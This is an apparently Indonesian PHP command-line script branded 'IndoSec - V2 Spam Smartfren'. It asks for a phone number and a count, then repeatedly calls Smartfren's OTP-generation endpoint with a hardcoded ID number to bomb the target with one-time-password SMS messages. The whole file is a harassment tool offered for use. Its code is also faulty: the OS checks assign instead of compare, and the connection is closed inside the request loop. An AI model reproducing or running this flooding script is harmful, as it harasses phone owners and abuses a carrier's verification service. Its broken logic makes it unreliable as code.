<?php
function os()
{
	$os = PHP_OS;
	if ($os = "linux") {
		system("clear");
	}elseif ($os = "windows") {
		system("cls");
	}
}
function banner()
{
echo "
────────────────────────────────────
╔╦╗┬ ┬╔═╗╔═╗    | {IndoSec - V2}
║║║└┬┘╚═╗╠╣     | Spam Smartfren
╩ ╩ ┴ ╚═╝╚ ren  | By Arikun x Momos
───────────────────────────────────
";
}
function isian()
{
	# code...

	echo "Nomor HP : "; $nomorhp = trim(fgets(STDIN));
	echo "Jumlah : "; $jumlah = trim(fgets(STDIN));

	$data = "mdn_ver=".$nomorhp."&ktp_ver=3215656356357857";
	$semua = $jumlah;
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://my.smartfren.com/modem_api/generate_otp");
	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
	CURL_SETOPT($ch, CURLOPT_POST, 1);
	CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, true);
	CURL_SETOPT($ch, CURLOPT_HTTPHEADER, array('User-Agent: Mozilla'));

	for ($i=1; $i < $jumlah ; $i++) { 
		$exec = curl_exec($ch);
		curl_close($ch);

		$hasil = json_decode($exec, true);
		if ($hasil['status_code'] == "000") {
			echo "Spam Sukses => ".$nomorhp."[".$jumlah."]";
		}else{
			echo "Spam Gagal => ".$nomorhp."[".$jumlah."]";;
		}
	}
}
os();
banner();
isian();
?>
